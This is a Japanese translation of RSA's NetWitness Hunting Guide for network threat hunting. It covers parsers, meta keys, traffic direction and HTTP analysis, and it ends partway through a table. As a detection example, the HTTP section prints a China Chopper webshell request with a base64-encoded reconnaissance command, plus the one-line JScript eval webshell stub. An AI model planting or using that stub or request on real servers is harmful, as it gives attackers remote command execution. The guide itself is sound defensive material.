---
layout: post
title:  "Netwitness Hunting Guide"
date:   2018-09-18
permalink: /security/:title
categories: Security
tags: Netwitness
excerpt: Netwitnessハンティングガイドの和訳
mathjax: false
---

* content
{:toc}

RSA NetWitness Platformは、旧称セキュリティアナリティクスと呼ばれるNetWitness NextGenセキュリティ製品の後継です。
ネットワークトラフィックとログを取り込み、データに対して複数の論理層を適用し、カスタムデータベースに値を格納し、メタデータを統一ビューでアナリストに提示します。
ホストベースのメモリフォレンジックツールであるECATと統合すると、ホストアクティビティに関するメタデータが生成され、同じビューに表示され、アナリストはネットワークの状態を比類のないものにすることができます。
このガイドでは、悪意のある活動のパケットデータセットを調べるための戦術と手順について説明します。

NetWitnessは、一般的なネットワークトラフィックベースのセンサーではなく、IDS/IPSまたはNetflowデバイスではありませんが、より基本的な機能の中には重複するものもあります。
メタデータは、ネットワークセッション内の技術的側面または動作を記述するために生成されます。
セッションは通常、リクエストとレスポンスから成る1つまたは2つの関連するトラフィックストリームとして定義されます。
これらのセッションはキャプチャされた時間によって順序付けられ、このような時間の情報は調査を開始するときにデータベースに適用される最初の条件式になります。
データがどのように収集され、発注されたかを知ることは、NetWitnessをどのように捜索するかを理解する上で不可欠です。

NetWitnessのメタデータは、従来のIDS/IPSで使用されているようなシグネチャではなく、別の方法で処理する必要があるアクティビティのインジケータとみなす必要があります。
NetWitnessパーサーに含まれるロジックは、標準的な正規表現ベースのシグネチャよりもはるかに汎用性があります。
トラフィックを処理するパーサー、フィード、アプリケーションルールは、データの構造に関するメタデータを生成し、効率的に検索できる個々のセッションから値を抽出します。
これは従来のIDS/IPSソリューションとは異なり、以前に特定された悪意のあるアクティビティを特定するだけではなく、新たな未知の悪意のあるアクティビティを見つけることが可能です。
シグネチャのようなパーサーも含まれていますが、パーサーエンジンでは一般的なスクリプト言語Luaによる複雑なロジックを使用して判断しており、偽陽性率がはるかに低くなります。
このガイドでは、RSA Liveコンテンツ管理システムによって提供されるコンテンツを使用して、未知の新たな悪意のあるアクティビティを捜すことに焦点を当てています。
通常、シグネチャのようなパーサーの概要は含まれていません。

NetWitnessデータセット内でのハンティングは、不正侵入を分析し、マルウェアをリバースエンジニアリングし、マルウェアやその他の攻撃によって生成されたトラフィックを分析し、このタイプの動作に基づいてNetWitnessによって生成されたメタデータを選択することによって達成されます。
RSA IRチームは2012年に設立されて以来多くの調査を行い、アナリストが行動の多くの側面を単一のメタデータに組み合わせることで迅速にデータセットをナビゲートできるようにするプラットフォームのコンテンツと戦術を作成しました。
これにより、目的の動作でセッションを検索するのに必要なドリルダウンの数が削減され、プラットフォームのパフォーマンスが向上し、悪意のある動作を検出するのに必要な労力が削減されます。
これにより、IRチームは、組織が標的とされた攻撃を受けているという事前の知識や通知なしにインシデントを発見することができました。
IRチームはまた、これらの方法論とコンテンツを使用して、攻撃者がマルウェアを使用していない多くのインシデントを検出しましたが、認証されたアクセスは「LANd」と呼ばれています。

NetWitnessによって提供されるネットワークトラフィックの前例のない見方は、インシデント対応機能にとって最も効果的ですが、セキュリティポリシーの適切な施行の検証や、これらのポリシーや手順の改善が必要な領域の発見にも使用できます。
このガイドは、既知の脅威に基づいてアラートに反応するのではなく、新しい悪意のあるアクティビティを明らかにするアナリストを対象としています。

# ハンティングパック

ハンティングパックは、RSA NetWitness Platform内のパケットトラフィックを分析し、特定のメタキーに調査のための自然言語値を入力することにより、侵害または異常なネットワークアクティビティのインジケータを素早く探し出すように設計されています。

ハンティングパックは、以下の別々の部分で構成されています。

- インジケータが設定された一連のメタキー
- メタデータの関連する組み合わせをアナリストに提供するメタグループのインポート
- 攻撃者が使用する一般的なプロトコルからネットワークセッションを解読する一連のLuaパーサー
- 調査フィードとRSA FirstWatch SSLブラックリストフィード。
- ハンティング関連のRSA NetWitnessレポート
- ハンティング関連のRSA NetWitnessルール
- Webshel​​lで検出されたESAルール：このルールは、10分の時間枠内で同じIP送信元と宛先のペアの間で3つのWebシェルが検出されたことを示します。詳細については、RSA ESA Rulesのトピックを参照してください。
- exeファイルタイプだがexe拡張子ではないアプリケーションルール

## ハンティングパックのデプロイ

ハンティングパックのすべてのアイテムをライブで展開することができます。

次の点に注意してください。

- 10.6.2より前のデプロイメントでは、netname、direction、ioc、boc、eoc、analysis.service、analysis.session、analysis.fileのような一連の新しいメタキーも設定する必要があります。 詳細は、「メタキー」を参照してください。
- trafflic_flow LuaパーサーはLog Decoderにデプロイできますが、現在はLiveでサポートされていません。 Traffic Flow Lua Parserのドキュメント（https://community.rsa.com/docs/DOC-44948）では、「Deploy to Log Decoders」セクションを参照してください。
- 展開できない環境にいる場合は、リソースパッケージを作成して、使用できるZIPアーカイブをダウンロードする必要があります。 バンドルでは機能しないので、ダウンロードボタンを使用しないでください。

## メタキー

Huntingコンテンツパックを構成するLuaパーサ展開の結果として生成されるメタキーは、次のとおりです。
これらは、RSA NetWitness Platformのバージョン10.6.2以降で追加構成なしで利用できます。
これより前のバージョンにコンテンツパックを展開する場合は、「付録：コンテンツパックのメタキーを使用する」を参照して、コンテンツパックを有効にする方法を参照してください。

|表示名|メタキー|書式|説明|
|:---:|:---:|:---:|:---|
|Behaviors of Compromise| boc | テキスト |標準的な署名ベースの検出以外の、疑わしい行為や不正な行為のために指定されています。
|Enablers of Compromise| eoc |テキスト|貧弱な情報や運用上の事例であり、セキュリティ侵害の根本原因につながる可能性があります。
|File Analysis| analysis.file | テキスト |ファイル特性と異常を強調する大規模な検査ライブラリです。
|Indicators of Compromise| ioc |テキスト|侵害のインジケータは、情報セキュリティの分野全体に遍在しています。分野に応じて分類保管することが重要です。
|Network Name| netname |テキスト|送信元または宛先にタグ付けされるネットワークおよびホストの記述です。これにより、複数のネットワークキーとアセットキーが不要になります。
|Service Analysis|analysis.service|サービス|テキスト|コアアプリケーションプロトコルを識別します。サービスベースの分析の根幹です。
|Session Analysis| analysis.session |テキスト|クライアント～サーバー通信の和、偏差、実行およびセッション属性です。
|Traffic Flow Direction|direction|テキスト|送信元と宛先から導出されたフローベースの情報。アウトバウンド、ラテラル、インバウンドのいずれかの値を持ちます。

## メタグループ

NetWitnessはアナリストに、調査中に表示されるメタデータビューとグループをカスタマイズする方法を提供します。
ハンティングを開始する前に、最初に設定する項目はメタデータグループです。
RSAは、インシデント対応のためのメタグループを含むファイルのZIPを提供します。
これらのファイルは、次のURLにあるRSA Linkのダウンロード領域のZIPアーカイブとして入手できます。https://community.rsa.com/docs/DOC-60112

メタグループの展開については、「調査：ユーザ定義のメタグループの管理」という項目の製品マニュアルの「メタグループのインポート」を参照してください。
デフォルトでは、メタキーは「閉じる」状態にあります。
ニーズとパフォーマンスの考慮事項に応じて、各キーのデフォルトで「開く」ビューステートに変更することができます。

|表示名|ファイル名|説明|
|:---:|:---:|:---|
|Outbound HTTP|Outbound_HTTP.jsn|調査ページを設定して、HTTPプロトコルに関連するメタキーインジケータを表示します。
|Outbound SSL / TLS|Outbound_SSL_TLS.jsn|調査ページを設定して、SSL/TLSプロトコルに関連するメタキーインジケータを表示します。

## Luaパーサー

LiveからHunting Pack Luaパーサーを導入することができます。
Live SearchのUI内で以下にリストされているパーサーを選択し、デプロイメントまたはデコードのサブスクリプションのプロセスを選択します。

### ハンティングパックに含まれるLuaパーサーの一覧

|表示名|説明|
|:---:|:---|
|apt_artifacts |可能な適切なWMIとWindowsレジストリ操作を検出します。
|china_chopper |クリアテキストの中国チョッパーセッションを検出します。
|CustomTCP | CustomTCPビーコン活動を検出します。 C2ドメインと被害者ホスト名をalias.hostメタとして登録します。
|DNS_verbose_lua | DNSセッションを識別します。 レコードタイプを含むクエリレコードとレスポンスレコードを登録します。 プロトコルエラーメッセージを登録します。
|DynDNS |動的DNSホストとサーバーを検出します。
|fingerprint_java | Java JARファイルとCLASSファイルを検出します。
|HTTP_lua | HTTPプロトコル要求ヘッダーおよび応答ヘッダーから値を抽出します。 ICAP（HTTP）要求を解析します。
|HTTP_lua_options |このファイルを使用して、HTTP_luaパーサーの動作に影響を与えます。 詳細は、「HTTP Lua Parserオプションファイル」を参照してください。
|ICMP | ICMPパケットからタイプとコードを提供します。
|IDN_homograph|ラピッドUnicodeコードポイントのグリフに似ている非ラテンのUnicodeコードポイントを使用する、punycodeでコード化された国際化ドメイン名を検出します。解析されたホモグラフをanalysis.serviceメタとして登録します。 この脅威の詳細については、RSA ResearchのRSA Linkのブログ記事を参照してください。PunyCodeの解読 - すべての文字が等しく作成されているわけではありません。
|JSON-RPC | JSON-RPC 2.0ストリームを識別します。 JSON-RPC 1.0ストリームを識別せず、HTTPなどのトランスポートを介してJSON-RPCを識別しないことがあります。
|MAIL_lua |電子メールアドレス、件名、クライアントなどの電子メールメッセージから値を抽出します。
|Mail_lua_options |このファイルを使用して、Mail_luaパーサーの動作に影響を与えます。詳細については、Mail Lua Parserオプションファイルを参照してください。
|MSU_rat | MSU RAT活動を検出します。
|plugx | PlugXマルウェアを検出します。
|Poison_Ivy | Poison Ivy RATアクティビティを検出します。
|pvid | PGV_PVIDマルウェア活動を検出します。 PGV_PVIDは、アクターがマルウェアのPOSTルーチンに入れたクッキー文字列です。
|RDP_lua | Microsoftリモートデスクトッププロトコルを識別します。
|rekaf | rekafの亜種を検出し、感染したホストのxor key（crypto）と名前を取得します。
|fingerprint_rtf_lua | RTFファイルを検出します。
|session_analysis |送信されたバイト数、受信されたバイト数、TCPフラグなどのセッション特性を分析します。
|SMB_lua | Microsoft SMB / CIFSプロトコルバージョン1および2を解析します。
|struts_exploit | XMLペイロードを処理するためにStruts RESTプラグインとXStreamハンドラを併用すると、リモートでコードが実行される可能性のある攻撃を検出します。
|supercmd |SuperCMDトロイの木馬ビーコンを検出します。 この脅威の詳細については、RSA ResearchのRSA Linkのブログ記事「SUPERCMD RAT」を参照してください。
|TLD_lua |ホスト名からトップレベルドメイン部分と第2レベルドメイン部分を抽出します。
|TLD_lua_options |このファイルを使用して、TLD_luaパーサーの動作に影響を与えます。 詳細については、TLD Lua Parserオプションファイルを参照してください。
|TLS_lua | SSL 2.0、SSL 3.0、TLS 1.0、TLS 1.1、およびTLS 1.2を識別します。
|traffic_flow |内部ネットワークのサブネット名、およびセッションの方向性（インバウンド、アウトバウンド、ラテラル）を提供します。
|traffic_flow_options |これは、traffic_flowルアパーサーで使用するオプションのファイルです。 このファイルを使用すると、このパーサー（Traffic Flow Lua Parser）の完全な製品マニュアルに記載されているように、内部サブネットを構成することができます。
|windows_command_shell_lua | Microsoft Windowsのコマンドシェルセッションを識別します。
|windows_executable | Windows実行ファイルを識別し、異常やその他の不審な特徴を分析します。
|xor_executable_lua | xorまたはhexエンコードされた実行可能ファイルを検出します。|

### Luaパーサーオプションファイル

以下のLua Parserには現在、オプションファイルが関連付けられています。
- HTTP_lua
- Mail_lua
- TLD_lua
- traffic_flow

```
注意：RSAでは、オプションファイルを購読しないことを強く推奨しています。
このファイルを後でダウンロードすると、ファイルに加えたすべての変更が上書きされます。
```

次の点に注意してください。

- オプションファイルを配備すると、パーサーと同じディレクトリに/etc/netwitness/ng/parsers/があります。
- パーサーはオプションファイルに依存しません。 パーサーは、オプションファイルがなくてもロードして実行します。 オプションファイルは、デフォルト設定を変更する必要がある場合にのみ必要です。
- オプションファイルがない場合（またはオプションファイルが無効な場合）、パーサーはデフォルト設定を使用します。
```
注意：パーサーは、デフォルトとカスタマイズされたオプションの両方を使用することはありません。 オプション・ファイルが存在し、その内容をロードできる場合、デフォルトはまったく使用されません。
```
## RSA Netwitness プラットフォーム レポート

RSAはHunting Packの一部として2つのレポートを提供しています。

- ハンティングサマリーレポート：このレポートは、以下のメタキーに従って分類されたイベントの概要を表示します。
- ハンティング詳細レポート：このレポートには、アナリストを支援する文脈の証拠が追加された次のメタキーに従って分類されたイベントが表示されます。
```
注：これは日次レポートとして実行する必要があります。
報告されるメタ値の量は、トラフィック量に応じて大きくなり、より長い時間枠で実行するとクエリのタイムアウトが発生する可能性があります。
```

これらのレポートは、以下のメタキーに従って分類されたイベントに基づいています。

- Indicators of Compromise
- Behaviors of Compromise
- Enablers of Compromise
- Service Analysis
- Session Analysis
- File Analysis

## RSA Netwitness プラットフォーム ルール

2つのハンティング・パック・レポートは、以下のルールに依存しています。
```
注：個々のルールをダウンロードまたは展開する必要はありません。これらのルールはハンティングレポートの依存関係であるため、レポートをダウンロードまたは展開するときに受信します。
```

ハンティングサマリーレポートは、次のルールに依存しています。

- **妥協のふるまい**：標準的な署名ベースの検出以外の疑わしい動作や悪意のある動作に対して指定されます。このルールは、メタキーBehaviors of Compromiseが入力されたときに出力を表示します。
- **危殆化の可能性**：情報が不十分であるか、運用上のセキュリティのインスタンス。死後は、これらを根本的な原因に結びつけることがよくあります。このルールは、メタキーEncomlers of Compromiseが入力されたときに出力を表示します。
- **ファイル解析**：ファイルの特性や異常を強調する大規模な検査ライブラリ。このルールは、メタキーFile Analysisが入力されたときに出力を表示します。
- **脆弱性の指標**：ネットワークへの侵入の可能性があり、マルウェアシグネチャまたはコマンドとコントロールのキャンペーンに関連するIPやドメインによって識別できます。このルールは、メタキーIndicator of Compromiseが入力されたときに出力を表示します。
- **サービス分析**：コアアプリケーションプロトコルの識別と検査。このルールは、メタキーService Analysisが入力されたときに出力を表示します。
- **セッション分析**：ファイルの特性と異常を強調する大規模な検査ライブラリ。このルールは、メタキーFile Analysisが入力されたときに出力を表示します。

ハンティング詳細レポートは、次のルールに依存しています。

- **妥協詳細の振る舞い**：妥協規則の動作と比較した追加の文脈は、サービスタイプとデバイスタイプの追加のメタキーをグループ化することによってアナリストに提供されます。
- **妥協の詳細イネーブラー**：サービスタイプとデバイスタイプの追加のメタキーをグループ化することにより、アナライザーに追加のコンテキスト（妥協ルールのイネーブラーと比較して）が提供されます。
- **ファイル解析の詳細**：Filenameの追加のメタキーをグループ化することにより、（ファイル解析ルールと比較して）追加のコンテキストがアナリストに提供されます。
- **妥協詳細の指標**：妥協規則の指標と比較した追加の文脈は、サービスタイプとデバイスタイプの追加のメタキーをグループ化することによってアナリストに提供されます。
- **サービス分析の詳細**：追加のコンテキスト（サービス分析ルールと比較して）は、サービスタイプとエイリアスホストの追加のメタキーをグループ化することによってアナリストに提供されます。
- **セッション分析の詳細**：追加のコンテキスト（セッション分析ルールと比較して）は、サービスタイプとエイリアスホストの追加のメタキーをグループ化することによってアナリストに提供されます。

# トラフィックフローの識別

ネットワークトラフィックがNetWitnessによってどのように処理され、ユーザーに表示されるかを理解することが重要です。
図1は、Decoderサービスがどのようにパケットをキャプチャし、それらを「ページ」と呼ばれるものにメモリにコピーするかを示しています。
キャプチャされるときにフレームが最初に入るプールは、パケットキャプチャプールです。
ここでは、セッションはAssemblerの既存のセッションに追加されたパケットまたは開始されたパケットです。
NetWitnessはIPv4とIPv6を認識しており、TCP SYNフラグを要求として、もう一方を応答として含むTCPセッションの最初のフレームをマークします。
非TCPベースのIPプロトコルまたは継続トラフィックの方向性は、いくつかの基準によって決定されます。

- クライアントが最初に話す
- サーバーは通常より多くのデータを提供します
- サーバーは通常、利用可能であれば、より低いポートを持つ
- サーバーは非RFC1918 IPである必要があります
- 組織は、通常、静的IPアドレスとサーバに低いIPオクテットを使用します

これらの考慮事項は重み付けされ、Explorerインタフェース内のassembler.voting.weightsの値を変更することで調整できます。

Assemblerでセッションが開始されると、2つのタイマーが開始されます。
1つは、セッションが開始されてから60秒後にカウントされます（SAデフォルト）。
セッションは、解析され、解析され、ディスクに書き込まれます。
2番目のタイマーはバイトタイマーで、32 MB後（SAのデフォルト）、セッションは宣言され、解析され、ディスクに書き込まれます。
非常に低い帯域幅と長時間のセッションがセッションの全期間にわたってアセンブラに残り、60秒以上の寿命値でエンドツーエンドで提示されるいくつかのエッジケースがあります。

![Figure 1. NetWitness Decoder Capture and Processing](https://community.rsa.com/servlet/JiveServlet/showImage/102-62341-232-466474/NWDecoderProcessing_583x404.png)

## トラフィックの方向性

長時間NetWitnessを使用したことがあるなら、ネットワークには雑音が多いことがわかるでしょう。
再送信、片面セッション、ゼロペイロードセッション、ピアツーピア通信があり、データセットの分析がより困難になります。
データセットを分析するときは、まず方向性を見極めなければなりません。
内から外、外から内、内から内のどれを見たいですか？
traffic_flow.luaパーサは、デコーダ上のtraffic_flow_options.luaファイルで設定されたオプションに基づいてこの判断を行います。
詳細については、RSA LinkのTraffic Flow Lua Parserのトピックを参照してください。

これは、方向を決定するために使用される他のルーティング不可能なIPのブロックと同様、RFC1918のIPアドレス空間を定義します。
組織が提供されたオプションファイルを、内部ネットワークとその名前だけでなく、LAN-to-LAN IPSECトンネルなどの興味深いトラフィックACLなど、組織が使用する非RFC1918 IPスペースで変更することが推奨されます。

次の表は、traffic_flow_options.luaファイルを変更せずにデフォルトでトラフィックフローに使用されるDirectionに格納されたメタデータを示しています。

|方向性メタデータ|説明|
|:---:|:---|
|inbound|RFC1918ではない送信元からRFC1918の宛先への通信
|outbound|RFC1918の送信元からRFC1918ではない宛先への通信
|lateral|RFC1918の送信元からRFC1918の宛先への通信

## セッション特性メタカテゴリ

セッション特性メタカテゴリは、キャプチャされたセッションの技術的側面を調べることによって、このロジックを拡張します。
これらのストリームでペイロードが送信された場合、ストリームの数、セッションの存続期間、送信されたデータと受信されたデータの比、および分析ロジックを分析者に提供するためにこのロジックの一部を組み合わせます。
以下の表は、Session Characteristicsメタカテゴリを示しています。
これらのメタキーは、session_analysis Luaパーサーによって生成されます。

|セッション特性メタデータ|説明|
|:---:|:---|
|single sided tcp |単一のストリームを持つIPプロトコル6
|single sided udp | IPプロトコル17
|zero payload|ペイロードがゼロの任意のプロトコル
|first carve|2つのストリームとペイロード> 0のアウトバウンドトラフィックを作成する
|first carve not dns| 2つのストリームとペイロード> 0で、サービスタイプ53ではないアウトバウンドトラフィック
|first carve not top 20 dst|AppleまたはMicrosoftのような最も一般的な20の宛先の1つではない2つのストリームとpayload> 0およびorg.dstを持つアウトバウンドトラフィック。
|long connection|寿命が50秒を超える接続、NetWitnessでの最大有効期間はデフォルトで60秒です
|session size 0-5k |合計セッション・サイズ、要求+応答ペイロード、0KBから5KB
|session size 5-10k|合計セッションサイズ、要求+応答ペイロード、5KB〜10KB
|session size 10-50k |合計セッションサイズ、要求+応答ペイロード、10KB〜50KB
|session size 50-100k |合計セッションサイズ、要求+応答ペイロード、50KB〜100KB
|session size 100-250k | 100KB〜250KBの合計セッションサイズ、要求+応答ペイロード
|medium transmitted outbound|セッション中に送信されたアウトバウンドが1MB〜4MBの間
|high transmitted outbound|セッション中に送信されたアウトバウンドが4MBを超える
|ratio high transmitted|アウトバウンドで送信されたセッションペイロードの75％〜100％
|ratio medium transmitted|アウトバウンドで送信されたセッションペイロードの26％〜74％
|ratio low transmitted |アウトバウンドで送信されたセッションペイロードの0％〜25％

この基本的なロジックを利用して、トラフィックがどの方向に流れているのかを理解し、データセットを分割し始めることができ、興味深い行動に集中することができます。
NetWitness Decoderサービスは、セッションの方向性に関するサニティチェックを試行しません。
つまり、セッションの最初のフレームとしてTCP FINパケットを受信すると、要求元のIP/ポートの組み合わせがリクエスタとしてタグ付けされます。
ときどき与えられた例は以前はクローズされていた別のセッションの一部である場合もありますが、別の種類の悪意のある活動を表すこともあります。

NetWitnessは法医学ツールであり、プロトコルの非RFC準拠の使用と見なされるものを修正しようとせず、取得したデータのみを提示します。
たとえば、組織内から発信された、ペイロードを持ち、宛先がインターネットであった非DNSセッションに興味があった場合は、最初のドリルダウン条件としてSession Characteristicsの下にdnsを挿入しないで簡単にクリックします。
これにより、現在の関心事ではなく、私たちの組織内で発信され、インターネットに出て行くトラフィックの調査に関連するセッションやそれに伴う「ノイズ」が取り除かれます。
Facebookやトロイの木馬C2プロトコルで注文を取得しているユーザーがYouTubeビデオを見ている可能性があります。

逆に、インターネットから組織への接続を探すには、NetWitness Decoderデバイスの特定の知識と特別な配置が必要です。
必要な考慮事項は次のとおりです。

- ロードバランサはありますか？
- インバウンドWebサービスは、Web、アプリケーション、データベースなどの異なるDMZに分割されていますか？
- DMZサーバーはRFC1918 IPスペースとNAT/PATを使用していますか、またはルーティング可能なアドレスでIPアドレスを割り当てられていますか？
- DMZ間の通信か、着信/発信の種類の通信のみを表示できますか？
- DMZはInsideネットワークに接続できますか？

これをマッピングするときには、次のドリルでデータセットを調べることをお勧めします。
`org.src exists && tcpflags = 'syn'`
これにより、IPソースがインターネットでルーティング可能であり、TCP SYNフラグを使用してセッションの開始が確認されます。
これによりアナリストを混乱させるかもしれない継続セッションが削除されます。
副作用として、処理中にセッションがデコーダによって切断されたことを示すmeta session.splitとともに、これらの長いセッションが表示されます。
リンクされたセッションは、FTPが現在処理されているのと同様にピボットされます。
次に、org.dstの組織の名前を調べます。
これは、IPスペースの登録方法に応じていくつかの方法で解決できます。
この基本ドリルを使用すると、前の段落の質問に答えることができ、インターネットがDMZサーバーとやりとりするさまざまな方法や、DMZサーバーがインターネットとやりとりする方法、内部ネットワークと相互作用する方法を分析できます。

アナリストは、組織がインターネットに公開する方向性とサービスを分析することで、特定の種類の行動を調査し、現在の調査では面白くないと思われる他のセッションを排除するためのメタデータを作成できます。
推奨セグメンテーションは、下の表に示されています。

|推奨される方向性ルールの分類|
|:---:|
|インターネットとのアウトバウンド通信
|内部から内部へのコミュニケーション
|インバウンドWebアプリケーション通信
|受信SMTP通信
|着信その他のアプリケーション
|DMZと内部通信
|受信VPN接続のクリアテキスト側
|B2Bまたはパートナーコミュニケーション

# プロトコル分析：HTTP

ハイパーテキスト転送プロトコルは、インターネット上で最も広く使用されているプロトコルの1つです。
ほとんどのSSL/TLS送信でさえ、単にHTTPをトンネリングするだけです。
任意のデータセット内で膨大な量のHTTPセッションが分析されます。
Live Contentのパーサーとアプリケーションルールは、プロトコルの動作と技術的側面に重点を置いています。
HTTPの通信方法やマルウェアの生成されたHTTPトラフィック、ユーザーが生成したHTTPトラフィックを分析することで、アナリストは、データセット内の何が外れているのか、正常であるのかを迅速に判断できるようになります。
これは、マルウェア作成者の間では一般的な戦略であり、通常のネットワーク通信と混同して、できるだけ無害なものにしたいと考えています。
しかし、トロイの木馬は本質的にプログラマティックで構造化されており、通信が明らかになれば通信はビジネス上の価値を保持しません。

X秒/分ごとにアップデート用のビーコンとなるマルウェア（株価、天気など）に似ている、無害のカスタム構築アプリケーションが多数存在することに注意してください。
アラートやブロックを行わずにネットワーク検査デバイス（IDS / IPS）を通過させるために、多くの場合、「偽の」HTTPヘッダーがあります。

## HTTP構造

HTTPには、0.9,1.0,1.1、SPDY、ドラフト2.0の提案など、多くの異なるバージョンがまだ一般的に使用されています。
SPDYとHTTP/2.0を除いて、ヘッダー要求/応答構造は基本的に同じです。
クライアントは、GET、POST、PUTなどのRequest Methodで始まります。
パスとファイル名（Webアプリケーションの場合は引数の有無にかかわらず）、HTTPバージョン、最初の改行と改行が16進数で0x0D 0x0Aです。
さまざまなHTTPヘッダーが続きますが、ヘッダー名はコロン文字（ "："）で区切られ、1から2つのスペース（0x20）で区切られ、最後に別のキャリッジリターンと改行と次のヘッダーが続きます。
HTTPデーモンは、実際に本体が存在する場合、次のバイトが本体であることを示す二重のキャリッジリターンと改行を解析するときに、ヘッダーセクションが終了したことを認識します。
本文がある場合は、Content-Lengthヘッダーが存在し、正しくなければなりません。

図2. HTTP GET構造は、HTTP GET要求と応答の基本構造の概要を示しています。
図3. HTTP POST構造は、HTTP POST要求と応答の基本構造の概要を示しています。

![Figure 2. HTTP GET Structure](https://community.rsa.com/servlet/JiveServlet/showImage/102-62341-232-466478/HTTP_Get_594x172.png)

![Figure 3. HTTP POST Structure](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466605/HTTP_Post_608x239.png)

## HTTPメソッド

メソッドは、HTTPのコンテキストでは、動詞です。
定義によって、HTTPはWebDav（Web Distributed Authoring and Versioning）に7つのメソッドを追加して9つのメソッドをサポートします。
最も一般的な使用方法はGETで、これはPOSTメソッドの約10倍です。
これは、後に利用する重要な観察です。
アナリストがNetWitnessで何を見ているのかを理解するためには、HTTPのRFC構造に加えてHTTPメソッドも理解する必要があります。
以下の表は、一般的なHTTPメソッドを示しています。

|メソッド|説明|
|:---:|:---|
|GET|指定されたリソースを取得する
|POST|POST本体のサーバーにリソースを送信する
|PUT|ファイルなどのリソースをサーバーに保管する
|HEAD|指定されたリソースを取得しますが、本文を省略します。
|DELETE|サーバー上のリソースを削除する
|TRACE|プロキシ/ MitM検出のために要求を送信者に返します
|OPTIONS|サポートされているメソッドを示すようにサーバーに要求する
|CONNECT|HTTP経由で別のプロトコルをトンネルする
|PATCH|指定されたリソースに部分的な変更を適用する

HTTP / 1.1では、パイプライニングと呼ばれる機能が導入されました。
以前のバージョンのHTTPでは、サーバーから要求されたすべてのリソースに対して新しいTCPセッションが開始されます。
現代のWebアプリケーションでは、ページビューごとに何千ものTCPセッション（数千ではないにしても）を開始する可能性があります。
パイプライン処理では、接続が維持されている限り、同じTCPセッションを再利用できます。
このため、HTTP / 1.1セッションでアナリストはGETメソッドとPOSTメソッドを1つのセッションで、また潜在的に複数のファイルとフォレンジックの指紋を見ることができます。
ほとんどのマルウェアの作成者は、常時接続されているのではなく、迅速なビーコンを好み、C2インフラストラクチャでチェックインします。
HTTPヘッダーブロック全体を構成する個々のHTTPヘッダーは、有効な双方向通信のための一般的なデータではない、要求あたり4〜8 KBの合計サービスレベル制限を持っています。
これは私たちが探しているマルウェアの動作面です。
HTTP経由でデータを送信するには、多くのトロイの木馬はHTTP POSTメソッドを使用し、パイプライン要求を処理することは気にしません。
これを念頭において、以下の規則は、HTTPセッションの対話型を機械的なものから除外するのに役立ちます。

```
注：次のメタデータがHTTP Luaパーサーに追加されました。
これらのキーは、戻り値を "false"から "true"に変更することによって、HTTP_lua_optionsファイルで拡張機能が有効になるまで入力されません。
詳細は、「HTTP Lua Parser Options」のトピックを参照してください。
```

|サービス特性メタデータ|説明|
|:---:|:---|
|http post no get|HTTP POSTのみのセッション
|http get no post|HTTP GETのみのセッション
|http post and get|HTTP GETとPOSTから構成されるセッション
|http connect|HTTP CONNECTのみのセッション
|post no get no referer|リファラがないPOSTのみのセッション
|post no get no referrer directotoip|リファラがないIPアドレス直指定のPOSTのみのセッション

Webshel​​lsは、攻撃者がリモートでコマンドを実行できるようにするWebサーバー上の実行可能コードとして定義されています。
設定されたWebルート内のディレクトリに配置された実行可能ファイルで、HTTPデーモンが実行するように設定されている任意の言語にすることができます。
攻撃者がシステムコマンドを実行できる脆弱性を持つWebアプリケーションの一部としてインストールされた正当なスクリプトでもあります。
RSAは、正当なWebアプリケーションの一部である修正されたスクリプトと同様に、Webshel​​l機能を達成するためにシステムDLLを置き換えるトロイの木馬のDLLを観察しました。
Webshel​​lsは、HTTPメソッドを使用してコマンドを実行するように設定できます。
コマンド自体は、HTTPヘッダー、URL、またはPOSTメソッドの本体に含めることができます。
Webshel​​lのサイズは、1行から数千行までの範囲で指定できます。
それらは使用されていないときに検出することは難しく、過去2年間にRSAが遂行したほぼすべての事件で検出されます。

多くの一般的なWebシェルは、HTTP POSTメソッドを使用して、POSTの本体でコードを実行するスタブにコードを送信します。
これの1つの例はChina Chopper webshel​​lです。
スクリプトによって評価されるデータは、要求の本体にあります。
この場合のシグネチャベースの検出は非常に困難であるか、緩すぎて誤検出率が高くなりがちですが、コマンドごとにペイロードが変更され、固定されたものは通常、他の多くのケースで共通しています。
これらの場合の接続は維持されず、新しいコマンドが発行されると切断されます。
`direction = inbound`および`analysis.service = http post no get`を検索すると、暗号化されていない場合、このタイプの動作を検出するのに適しています。
以下はそのような要求の例です。

```
POST /ftpadmin.aspx HTTP/1.1
Cache-Control: no-cache
X-Forwarded-For: 248.192.237.178
Referer: http://ftp.example.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: ftp.example.com
Content-Length: 1091
Connection: Close

cookie=Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("ßSNIPàk7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();&z1=Y21k&z2=Y2QgL2QgIkM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSAv
YWxsJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
```

```
<%@ Page Language="Jscript"%><%eval(Request.Item["cookie"],"unsafe");%>
```

## HTTPヘッダ

http.luaパーサーは、HTTPサービスの分析を担当します。
http_lua_options.luaファイルを変更することにより、より冗長な解析を行うように構成することができます。
次のオプションがあります。

- 完全なURLを操作する
- X-Forwarded-For HTTPヘッダーの登録
- HTTPリファラーパスの解析と登録
- HTTPヘッダーUser-Agentを独自のメタ鍵に解析する
- HTTPレスポンスコードを分かりやすい名前に解決する
- HTTPヘッダーとその固有の値を冗長に解析する
- HTTPヘッダーの順序に基づいて、ブラウザフィンガープリントを付ける

これらのオプションは、デコーダのロードと保持時間を考慮して有効にする必要があります。
これらのオプションを有効にして（そしてパーサーのリロードを発行すると）、アナリストにはキャプチャされているHTTPトラフィックの詳細な説明が表示されます。
たとえば、パーサーは、リクエストのメソッドと構造に基づいてHTTPセッションを識別し、ヘッダーを繰り返してメタデータとして追加します。
ユニークな値もメタデータとして追加されますが、索引付けされません。
NetWitnessでは、索引付けされた値のみが照会可能です。
インデックスされていない値（ライフタイム、ストリーム、ペイロードなど）は照会できません。
ただし、キャプチャ/処理時に索引付けされていないメタデータを使用するアプリケーション・ルールを記述できます。
キャプチャ時にHTTPヘッダーとその一意の値を解析することで、ヘッダーとその一意の値に一致する「シグネチャ」タイプのアプリケーションルールを記述するのは簡単です。
HTTP.luaパーサーによって生成されたメタデータは以下に示されています。

|サービス特性メタデータ|説明|
|:---:|:---|
